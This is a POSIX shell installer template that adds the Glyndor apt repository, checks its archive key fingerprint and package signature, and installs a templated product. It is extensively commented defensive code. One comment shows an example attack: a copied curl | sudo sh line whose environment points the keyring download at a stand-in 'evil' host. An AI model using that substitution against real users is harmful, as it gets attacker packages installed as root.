#!/bin/sh
# Set up the Glyndor apt repository and install @PRODUCT@.
#
# Usage: curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh
#
# Generated from scripts/installer/install-template.sh in Glyndor/apt. Do not edit the
# published copy - edit the template.
#
# @PRODUCT@ ships as a signed .deb, so apt is the install: it verifies every
# package on every upgrade rather than once, and `apt upgrade` is what keeps the
# machine current. A binary dropped somewhere by hand stays on the version it
# was installed at until somebody remembers it.
#
# Installing through apt also brings in what @PRODUCT@ declares it needs, and
# apt installs Recommends as well as Depends by default.
#
# This sentence has been wrong twice, in opposite directions, so it is written
# to survive being read for a product it was not written about. It first named
# podman and podup specifically: true of epistle, the only product generated
# from this template at the time, and false the moment the template rendered
# for anything else. The correction then said podup recommends podman alone,
# which stopped being true when podup moved both podman and unattended-upgrades
# to Depends, and stayed on the page for a while after that.
#
# The template is shared, so nothing here can name a product's dependencies and
# stay true. What holds for every product is the mechanism, which is the only
# thing this says now.
set -eu

DEFAULT_URL="https://apt.glyndor.net/glyndor-archive-keyring.deb"
KEYRING_URL="${KEYRING_URL:-$DEFAULT_URL}"
KEYRING_PATH="/usr/share/keyrings/glyndor.gpg"

# Derived rather than overridable, deliberately. A separate variable would let a
# copied command line point the package at one host and its signature at
# another, which is the one arrangement that makes the check below meaningless.
# Moving the package moves its signature with it.
KEYRING_SIG_URL="$KEYRING_URL.asc"

# Fingerprint of the archive signing key. Downloading the keyring package is the
# one step that has nothing but the transport behind it; checking what it
# installed against this constant is what closes that window. Override for a
# fork with GLYNDOR_APT_FPR.
#
# Spaces are stripped and the value is upper-cased before it is compared, so
# the grouped form gpg prints and the README publishes -- "9ADF 04EA ..." --
# can be pasted straight in. Without that, a fork operator copying the
# published fingerprint gets "does not carry the expected fingerprint", which
# points at the key when the fault is the spaces.
DEFAULT_FPR="9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6"
GLYNDOR_APT_FPR="${GLYNDOR_APT_FPR:-$DEFAULT_FPR}"

# Both overrides above exist for forks and both are silent, which is the part
# worth changing. The attack they enable is not "someone controls your shell" --
# anyone who does needs no override. It is a copied command line:
#
#   KEYRING_URL=http://evil/x.deb GLYNDOR_APT_FPR=DEAD... \
#     curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh
#
# The visible URL is the real one. Everything that would have made the
# substitution obvious is in the environment, off the end of what a reader
# checks.
#
# Blocking the override would break the fork it was written for, so instead say
# what is in use. A line on the screen does not stop anyone determined; it
# removes the case where the substitution is invisible to someone who would have
# noticed it.
url_overridden=no
fpr_overridden=no
[ "$KEYRING_URL" = "$DEFAULT_URL" ] || url_overridden=yes
[ "$(printf '%s' "$GLYNDOR_APT_FPR" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')" \
	= "$DEFAULT_FPR" ] || fpr_overridden=yes

# --- output ------------------------------------------------------------------
#
# This runs under `curl ... | sudo sh`, so stdout is the user's terminal even
# though stdin is a pipe. That makes styled output safe here, but only after
# three separate opt-outs, and every one of them is somebody real:
#
#   [ -t 1 ]        redirected to a file, or read by another program. Escape
#                   sequences written there are not decoration, they are
#                   corruption of text somebody greps later.
#   NO_COLOR        the convention a user sets once for every tool on a machine.
#   TERM=dumb       what emacs shells and some CI runners report.
#
if [ -t 1 ] && [ -z "${NO_COLOR-}" ] && [ "${TERM-}" != dumb ]; then
	ESC="$(printf '\033')"
	DIM="${ESC}[2m"; BOLD="${ESC}[1m"; GREEN="${ESC}[32m"
	RED="${ESC}[31m"; OFF="${ESC}[0m"; CLR="${ESC}[2K"
else
	DIM=""; BOLD=""; GREEN=""; RED=""; OFF=""; CLR=""
fi

# The glyphs are U+2714 and U+2716. On a machine whose locale is not UTF-8 those
# bytes render as mojibake, so the test is on the charset rather than on the
# terminal -- it is the locale that decides whether the glyph arrives intact,
# and a Docker image with no locales set is the common case, not an exotic one.
case "${LC_ALL:-${LC_CTYPE:-${LANG-}}}" in
	*UTF-8*|*utf8*|*UTF8*) TICK="✔"; CROSS="✖"; DOT="·" ;;
	*)                     TICK="+"; CROSS="!"; DOT="-" ;;
esac

# %b is what expands the colour variables: POSIX printf does not interpret
# escapes inside %s, and `echo -e` is not portable to dash, which is the shell
# that actually runs this on Debian and Ubuntu.
#
# A step with no value prints no padding and no empty colour pair. Trailing
# whitespace and a bare reset are invisible on a terminal and are exactly what
# somebody diffing two install logs sees as a change that is not there.
step() {
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	if [ -n "${2-}" ]; then
		printf '  %b%s%b %-32s%b%s%b\n' "$GREEN" "$TICK" "$OFF" "$1" "$DIM" "$2" "$OFF"
	else
		printf '  %b%s%b %s\n' "$GREEN" "$TICK" "$OFF" "$1"
	fi
}

# Only on a terminal, and deliberately not a spinner: this line is overwritten
# by the next step(), so anything that survives into a log file would be a
# half-finished sentence claiming work that may not have happened.
doing() { [ -n "$CLR" ] || return 0; printf '  %b%s %s%b' "$DIM" "$DOT" "$1" "$OFF"; }

note() { printf '      %b%s%b\n' "$DIM" "$1" "$OFF"; }

banner() { printf '\n  %b%s%b %s %b%s%b\n\n' "$BOLD" "Glyndor" "$OFF" "$DOT" "$BOLD" "$1" "$OFF"; }
closing() { printf '\n  %b%s%b %s %b%s%b\n\n' "$BOLD" "$1" "$OFF" "$DOT" "$DIM" "$2" "$OFF"; }

fail() {
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	printf '  %b%s%b %s\n' "$RED" "$CROSS" "$OFF" "error: $1" >&2
	exit 1
}
# Whether the operator has vetoed this product by name. The daily Glyndor
# upgrade reads the system configuration after its own, so an
# Unattended-Upgrade::Package-Blacklist entry that matches the product freezes
# it, and a machine in that state must not be told it stays current.
#
# Read through `apt-config dump` rather than by opening files: the entry may come
# from any file in apt.conf.d, and apt is the thing that knows its own
# precedence. Entries are regular expressions, so "^product$" counts as well as
# the plain name; one that grep cannot parse is unknown, not a miss.
product_blacklist_state() { # prints: blacklisted | clear | unknown
	_dump="$(apt-config dump 2>/dev/null)" || { echo unknown; return 0; }
	[ -n "$_dump" ] || { echo unknown; return 0; }
	_entries="$(printf '%s\n' "$_dump" \
		| grep -E '^Unattended-Upgrade::Package-Blacklist::' \
		| sed -nE 's/.*:: "([^"]*)".*/\1/p')"
	for _e in $_entries; do
		# "|| _rc=$?": under set -e a plain non-match (1) would end the installer.
		_rc=0
		printf '%s\n' "@PRODUCT@" | grep -Eq -- "$_e" 2>/dev/null || _rc=$?
		case "$_rc" in
			0) echo blacklisted; return 0 ;;
			2) echo unknown; return 0 ;;
		esac
	done
	echo clear
}

# Whether the Glyndor upgrade timer, shipped by glyndor-archive-keyring, is on.
# That timer is what keeps every package from this archive current, and it is
# independent of the machine's own unattended-upgrades schedule: this asks about
# the timer and nothing else.
#
#   enabled     systemd will run it
#   disabled    the operator ran `systemctl disable`; the package never undoes it
#   no-systemd  not running under systemd, so there is no timer to run
#   missing     the unit is not installed (an older keyring that has not upgraded)
glyndor_timer_state() { # prints: enabled | disabled | no-systemd | missing
	[ -d /run/systemd/system ] || { echo no-systemd; return 0; }
	_state="$(systemctl is-enabled glyndor-upgrade.timer 2>/dev/null || true)"
	case "$_state" in
		enabled | enabled-runtime) echo enabled ;;
		disabled) echo disabled ;;
		*) echo missing ;;
	esac
}

# --- end output --------------------------------------------------------------

[ "$(id -u)" -eq 0 ] || fail "run this as root: curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh"

command -v apt-get >/dev/null 2>&1 \
	|| fail "no apt-get found. @PRODUCT@ ships as a .deb; on a non-Debian system, build from source (https://github.com/Glyndor/@PRODUCT@)"
command -v dpkg >/dev/null 2>&1 || fail "no dpkg found"
# dpkg-deb ships inside the dpkg package, so this guard is redundant on a sane
# system. It is here so that a stripped-down image fails with a clear message
# instead of "dpkg-deb: command not found" halfway through the keyring step.
command -v dpkg-deb >/dev/null 2>&1 || fail "no dpkg-deb found"

workdir=
installed_gnupg=
gnupg_deps=

# Remove gnupg and only the dependencies this script pulled in. --auto-remove
# would remove every auto-installed package no longer depended on,
# not only what this script installed, so the cleanup names the packages
# explicitly.
purge_gnupg() {
	if [ -n "$installed_gnupg" ]; then
		note "removing the gnupg this script installed"
		# Word splitting on $gnupg_deps is intentional: one package per line.
		# shellcheck disable=SC2086
		apt-get purge -y -qq gnupg $gnupg_deps >/dev/null 2>&1 </dev/null || true
		installed_gnupg=
	fi
	return 0
}

# The trap covers failures before signature verification. On success gnupg
# is purged before installing packages that may need the same libraries.
cleanup() {
	[ -n "$workdir" ] && rm -rf "$workdir"
	purge_gnupg
	return 0
}
trap cleanup EXIT
# dash runs the EXIT trap on `exit` but not when a signal ends the shell, so a
# Ctrl-C of `curl ... | sudo sh` left the work directory and the gnupg that was
# installed for the check behind. Turning the signal into an exit runs it.
trap 'exit 130' INT
trap 'exit 143' TERM

# Allocate $workdir before the gnupg install so the auto-set snapshot below can
# be written there. Cleanup removes it whether or not the snapshot ever made it
# to disk.
workdir=$(mktemp -d)

# gpg comes from the distribution's own trusted repositories, not ours, so
# installing it here does not widen what has to be trusted. It is needed for the
# fingerprint read and archive-signature check, so it goes back out afterwards,
# purged along with the deps it pulled in (and only those), and only when it
# was absent to begin with. --auto-remove is machine-wide and would remove
# every auto-installed package no longer depended on, which can include
# packages the operator pulled in independently of this script; this script
# only undoes its own install.
if ! command -v gpg >/dev/null 2>&1; then
	doing "installing gnupg, needed to check the archive key"
	apt-get update -qq </dev/null
	auto_before="$(apt-mark showauto 2>/dev/null | LC_ALL=C sort)"
	printf '%s\n' "$auto_before" > "$workdir/auto-before"
	apt-get install -y -qq gnupg </dev/null || fail "could not install gnupg"
	gnupg_deps="$(apt-mark showauto 2>/dev/null | LC_ALL=C sort | comm -13 "$workdir/auto-before" -)"
	installed_gnupg=yes
fi

# Printed after the tool checks, so the message lands on a machine that can act
# on it rather than scrolling past a "no apt-get found" a moment later.
if [ "$url_overridden" = yes ] || [ "$fpr_overridden" = yes ]; then
	echo "NOTE: this is not the stock Glyndor install." >&2
	[ "$url_overridden" = no ] || echo "  keyring source: $KEYRING_URL (default is $DEFAULT_URL)" >&2
	[ "$fpr_overridden" = no ] || echo "  expected key:   $GLYNDOR_APT_FPR (default is $DEFAULT_FPR)" >&2
	if [ "$url_overridden" = yes ] && [ "$fpr_overridden" = yes ]; then
		echo "  Both were replaced, so nothing here is checked against Glyndor's" >&2
		echo "  published key. That is correct for a fork and wrong for anything else." >&2
	fi
fi

banner "@PRODUCT@"
doing "downloading the archive keyring"
# Bounded, and redirects kept on https.
#
# The keyring is ~2 KB and stays kilobytes even carrying both keys through a
# rotation, so 8 MB is four thousand times the real size and still refuses a
# server that answers a 2 KB request with an endless body. Without it the only
# limit is the disk: this runs as root, and /tmp filling up takes the machine
# with it, before any fingerprint is ever compared.
#
# --proto-redir=https keeps -L from being talked down to http:// by a redirect.
# The fingerprint check would still refuse whatever arrived, but there is no
# reason to fetch a trust anchor over a downgraded connection to find out.
# --connect-timeout 20 --max-time 300 keeps a stalled connection from hanging
# the installer indefinitely. --max-filesize bounds the bytes and not the
# clock: measured against a server streaming 100 bytes per second, a curl with
# the size cap and no deadline ran until it was killed, and the same call with
# --max-time returned exit 28 on time. The numbers are generous on purpose,
# because this runs on a user's link rather than on a runner, and the package
# is a few kilobytes against an 8 MB ceiling.
curl -fsSL --proto-redir =https --max-filesize $((8 * 1024 * 1024)) \
	--connect-timeout 20 --max-time 300 \
	-o "$workdir/glyndor-archive-keyring.deb" "$KEYRING_URL" \
	|| fail "could not download $KEYRING_URL (over 8 MB, or the transfer failed)"

# And the detached signature over it, under the same bounds against a smaller
# ceiling: an armoured Ed25519 signature is a few hundred bytes.
#
# Fetched here rather than after the checks below so that both halves of what
# is served arrive together. A server that answers with the package and not the
# signature is refused before anything is unpacked.
curl -fsSL --proto-redir =https --max-filesize $((64 * 1024)) \
	--connect-timeout 20 --max-time 300 \
	-o "$workdir/glyndor-archive-keyring.deb.asc" "$KEYRING_SIG_URL" \
	|| fail "could not download $KEYRING_SIG_URL (over 64 KB, or the transfer failed)"

# Extract WITHOUT installing. `dpkg-deb -x` unpacks the data archive and runs no
# maintainer script, so nothing from the downloaded package executes until its
# key has been checked. `dpkg -i` here would run preinst/postinst as root, and
# those scripts can write the very keyring the check below reads -- with the
# expected fingerprint alongside an attacker's, which the presence test admits.
# Normalise here rather than where the constant is set: `tr` must not be
# needed before the guards above have established that this is a Debian system
# with the tools the installer uses. Reaching for a command ahead of the check
# that the environment has it is how a "no apt-get found" refusal turns into
# "tr: command not found".
# One fingerprint per line, spaces stripped and upper-cased, so the grouped form
# gpg prints can be pasted in and several can be given separated by commas.
GLYNDOR_APT_FPR="$(printf '%s' "$GLYNDOR_APT_FPR" \
	| tr ',' '\n' | tr -d '[:blank:]' | tr '[:lower:]' '[:upper:]' | grep -v '^$')"

step "Archive keyring downloaded"
doing "checking the archive key fingerprint"
mkdir -p "$workdir/extracted"
# The 8 MB cap above is on the COMPRESSED download. A package of a few hundred
# kilobytes can unpack to gigabytes, and this runs as root before any fingerprint
# is compared, so the data archive is read through a ceiling of the same size and
# only then unpacked.
dpkg-deb --fsys-tarfile "$workdir/glyndor-archive-keyring.deb" 2>/dev/null \
	| head -c $((8 * 1024 * 1024 + 1)) > "$workdir/keyring.tar" || true
[ -s "$workdir/keyring.tar" ] || fail "could not extract the keyring package"
[ "$(wc -c < "$workdir/keyring.tar")" -le $((8 * 1024 * 1024)) ] \
	|| fail "the keyring package unpacks to more than 8 MB; nothing was installed"
tar -x -f "$workdir/keyring.tar" -C "$workdir/extracted" --no-same-owner </dev/null \
	|| fail "could not extract the keyring package"

# EVERY key in the keyring must be one this installer was told to expect, not
# just one of them. The presence test this replaces admitted a keyring that
# carried the published key alongside an attacker's: apt then trusted both, and
# the sources.list the same package installs decides where it fetches from. That
# is what an attacker who can serve this .deb needs, and the published
# fingerprint does not stop it, because the published fingerprint is right there.
#
# A rotation still works: during the overlap the keyring carries the old key and
# the new one, so GLYNDOR_APT_FPR carries both. The order matters now -- publish
# both fingerprints BEFORE publishing the keyring that carries both, or clients
# refuse the new keyring until the second one is out.
#
# Only primary fingerprints are compared. `--with-colons` emits an `fpr:` line
# per subkey as well, and a subkey's fingerprint is not something anyone
# publishes; taking the first `fpr:` after each `pub:` is what isolates them.
keyring_fprs="$(gpg --show-keys --with-colons "$workdir/extracted$KEYRING_PATH" 2>/dev/null \
	| awk -F: '/^pub:/{want=1;next} /^fpr:/{if(want){print $10;want=0}}')"

# Do not remove this guard on the grounds that `set -e` covers it. It does not,
# and the reason is the interpreter rather than the logic.
#
# This is the only script here with a `#!/bin/sh` line, because it is fetched
# and piped into `sh`; every other script in this repository is bash and runs
# with `set -euo pipefail`. `pipefail` is not POSIX. It reached dash in 0.5.12,
# released in 2023, and this archive serves distributions older than that, so
# the option cannot be set here.
#
# Without it a pipeline exits with the status of its LAST command. In the
# assignment above, a gpg that fails writes nothing to stdout, its stderr is
# discarded, awk then reads empty input and exits 0, and the pipeline exits 0.
# `set -e` sees success. `keyring_fprs` is empty, the `for` loop below iterates
# zero times, every comparison it would have made is skipped, and the script
# walks into `dpkg -i` having verified nothing.
#
# This line is what turns that into a refusal.
[ -n "$keyring_fprs" ] \
	|| fail "the downloaded package carries no archive key at all; nothing was installed"

for fpr in $keyring_fprs; do
	printf '%s\n' "$GLYNDOR_APT_FPR" | grep -qxF "$fpr" || fail \
		"the downloaded keyring carries a key this installer was not told to expect ($fpr); nothing was installed"
done

# The fingerprint is printed rather than folded into the tick above. It is the
# one line of this output that a reader is asked to act on -- comparing it
# against README.md is what distinguishes this archive from one impersonating
# it -- and a check nobody can see is a check nobody performs.
step "Key fingerprint verified"
printf '%s\n' "$GLYNDOR_APT_FPR" | while IFS= read -r f; do
	[ -n "$f" ] || continue
	note "$(printf '%s' "$f" | sed -E 's/(.{4})/\1 /g; s/ $//; s/^(([0-9A-F]{4} ){5})/\1 /')"
done
doing "checking the archive signature"

# The check above authenticates the KEY. It says nothing about the package that
# carried it, and the package is what runs as root a few lines down.
#
# Two payloads pass everything up to this point. A substituted .deb can ship the
# genuine key alongside a hostile postinst, which `dpkg -i` executes. It can
# also ship a glyndor.sources carrying `Trusted: yes`, which turns off
# verification for everything apt subsequently fetches from that source, and
# needs no maintainer script at all. The precondition for both is the one this
# script already trusts once: whoever can serve the download.
#
# So verify the detached signature over the WHOLE package with the key that was
# just authenticated. The pinned fingerprint authenticates the key, the key
# authenticates the bytes. Substituting the package means keeping the genuine
# key to get past the fingerprint check, and then being unable to produce a
# signature over the substituted bytes here.
#
# gpg and not gpgv, although gpgv is the narrower tool. gpg is already
# guaranteed: the block near the top installs gnupg when it is missing and it is
# purged after verification (or by the exit trap on failure). gpgv is a separate
# binary that apt declares as `gpgv | gpgv2 | gpgv1` on some releases,
# and Debian trixie's apt depends on
# sqv instead, so requiring it would mean provisioning and removing a second
# package for one call.
#
# The exit status is the entire result, read directly rather than by grepping
# the output for "Good signature". That text is localised, and the pipeline
# trap described further up applies here as well.
#
# Measured with gpg 2.4.8, with the key present ONLY in --keyring and never
# imported into any trust store: a good signature exits 0, a package modified
# after signing exits 1, and a signature made by a key outside the keyring, a
# truncated one, an empty one and an absent file all exit 2. That an untrusted
# key still exits 0 is what makes --keyring on its own the right shape here:
# trust is not gpg's to decide, it comes from the fingerprint check above.
#
# The keyring argument has to be absolute. gpg resolves a bare relative
# --keyring path against GNUPGHOME rather than the working directory and then
# does not find the key, with nothing on screen saying so: measured, the call
# that exits 0 with an absolute path exits 2 with the same file named
# relatively. $workdir comes from `mktemp -d`, so it is absolute.
#
# GNUPGHOME points inside the work directory so that verifying leaves nothing
# behind on the machine, the same promise the rest of this script keeps. stdin
# is redirected because this script is itself being read from stdin by the shell
# running it, and an unredirected child would consume the rest of the program.
mkdir -p "$workdir/gnupg"
chmod 700 "$workdir/gnupg"
GNUPGHOME="$workdir/gnupg" gpg --no-default-keyring \
	--keyring "$workdir/extracted$KEYRING_PATH" \
	--verify "$workdir/glyndor-archive-keyring.deb.asc" \
	"$workdir/glyndor-archive-keyring.deb" </dev/null >/dev/null 2>&1 \
	|| fail "the downloaded package is not signed by the archive key it carries; nothing was installed"

step "Package signature verified"

# The product may depend on libraries gnupg pulled in. Purge those packages
# before installing the keyring or product, or apt can remove the product too.
# Clearing installed_gnupg prevents the exit trap from purging them again.
purge_gnupg

doing "installing the keyring"
dpkg -i "$workdir/glyndor-archive-keyring.deb" >/dev/null </dev/null \
	|| fail "could not install the keyring package"

step "Keyring installed"

# apt's own output is the bulk of what this script used to put on screen, and
# almost none of it is about @PRODUCT@: the dependency solver, the autoremove
# hint, and one `N:` line per unrelated file some other vendor left in
# sources.list.d. It is captured and shown only if apt fails, where it is the
# whole diagnosis.
#
# DEBIAN_FRONTEND matters specifically because the output is hidden. Without
# it, a package whose maintainer script asks debconf a question waits for an
# answer behind a screen showing nothing, which reads as a hang.
# Deliberately not -qq on the install. Capturing the output is what keeps the
# ordinary run quiet, so -qq buys nothing there and costs the whole diagnosis
# here: it suppresses the "unmet dependencies" block, leaving only
#
#     E: Unable to correct problems, you have held broken packages.
#
# which does not name the dependency that was not satisfiable. Measured on a
# machine whose podman was older than the Depends asks for -- the line that says
# WHICH package and WHICH version is the line -qq removes.
doing "installing @PRODUCT@"
if ! apt_log="$(DEBIAN_FRONTEND=noninteractive apt-get update -qq 2>&1 </dev/null \
	&& DEBIAN_FRONTEND=noninteractive apt-get install -y @PRODUCT@ 2>&1 </dev/null)"; then
	# Clear the in-progress line before apt's own output lands, or the two
	# collide on one row and the first thing a reader sees is a sentence
	# spliced out of two programs.
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	printf '%s\n' "$apt_log" >&2
	fail "apt could not install @PRODUCT@"
fi

# Run the installed binary rather than asking dpkg what version it recorded.
# dpkg answers from its database, so it would report a version for a package
# that unpacked but cannot start; this is the one step that proves what landed
# actually runs. Its last field is the version, and an empty result is left
# empty rather than guessed -- a blank column is honest, an invented one is not.
#
# Capturing stdout and stderr together, then checking the exit code, is what
# makes this a check rather than a print. A binary on PATH that cannot start
# (missing loader, wrong arch, missing library) exits non-zero, and the form
# that ended in `|| true` reported it as installed anyway. Without the exit
# check the step below says "installed" about a program that does nothing.
if version_line="$("@PRODUCT@" --version 2>&1)"; then
	:
else
	rc=$?
	first_line="$(printf '%s\n' "$version_line" | head -n 1)"
	[ -n "$first_line" ] || first_line="no output"
	fail "@PRODUCT@ is installed but does not start (exit $rc): $first_line"
fi
version="${version_line##* }"
step "@PRODUCT@ installed" "$version"

# Automatic upgrades.
#
# Every package from this archive is meant to keep itself current. That is done
# by glyndor-upgrade.timer, which glyndor-archive-keyring installed above and
# switched on the first time it reached this machine. It upgrades Glyndor
# packages and nothing else, so it neither depends on nor changes the machine's
# own unattended-upgrades schedule.
#
# What is left for this script is the engine the timer runs, which a product may
# not depend on, and telling the operator the truth about what they have:
# running, switched off by them, or unable to run.
# --- automatic upgrades ------------------------------------------------------
#
# Delimited because tests/installer/unattended-upgrades.test.sh runs this section in
# isolation.

# Empty means a branch below already said its piece in red; the script runs
# under `set -u`, so this cannot be left undeclared.
upgrade_switch=""

if ! command -v unattended-upgrade >/dev/null 2>&1; then
	apt-get install -y -qq unattended-upgrades >/dev/null 2>&1 </dev/null || true
fi

if ! command -v unattended-upgrade >/dev/null 2>&1; then
	printf '  %b%s%b %-32s%b%s%b\n' "$RED" "$CROSS" "$OFF" \
		"Automatic upgrades" "$DIM" "engine not installed" "$OFF" >&2
	note "unattended-upgrades could not be installed" >&2
	note "@PRODUCT@ will not be upgraded on its own" >&2
else
	case "$(glyndor_timer_state)" in
		enabled)
			upgrade_switch=on
			;;
		disabled)
			# Their choice; the package never re-enables it. Say so, and say
			# how to undo it, but do not undo it.
			printf '  %b%s%b %-32s%b%s%b\n' "$RED" "$CROSS" "$OFF" \
				"Automatic upgrades" "$DIM" "switched off, left alone" "$OFF" >&2
			note "@PRODUCT@ will not be upgraded on its own" >&2
			note "switch it on with: sudo systemctl enable --now glyndor-upgrade.timer" >&2
			;;
		no-systemd)
			note "this machine is not running systemd, so there is no upgrade timer" >&2
			note "upgrade by hand with: sudo apt-get install --only-upgrade @PRODUCT@" >&2
			;;
		*)
			note "the Glyndor upgrade timer is not installed" >&2
			note "@PRODUCT@ may not be upgraded on its own" >&2
			;;
	esac
fi

# One line, when the timer is on: it runs, and the operator has not vetoed this
# product. Both have to hold for the sentence a reader takes away -- that
# @PRODUCT@ stays current on its own -- to be true.
if [ "$upgrade_switch" = on ]; then
	case "$(product_blacklist_state)" in
		clear)
			step "Automatic upgrades" "daily, Glyndor packages only"
			;;
		blacklisted)
			printf '  %b%s%b %-32s%b%s%b\n' "$RED" "$CROSS" "$OFF" \
				"Automatic upgrades" "$DIM" \
				"on, but @PRODUCT@ is blacklisted" "$OFF" >&2
			note "Unattended-Upgrade::Package-Blacklist names @PRODUCT@" >&2
			note "so @PRODUCT@ will not be upgraded on its own" >&2
			;;
		*)
			# A green tick would imply the product is not vetoed; that has
			# not been verified.
			note "the daily upgrade is on, but the blacklist could not be read" >&2
			;;
	esac
fi
# --- end automatic upgrades --------------------------------------------------

closing "@PRODUCT@ $version" "upgrades and archive-key renewals both arrive through apt"
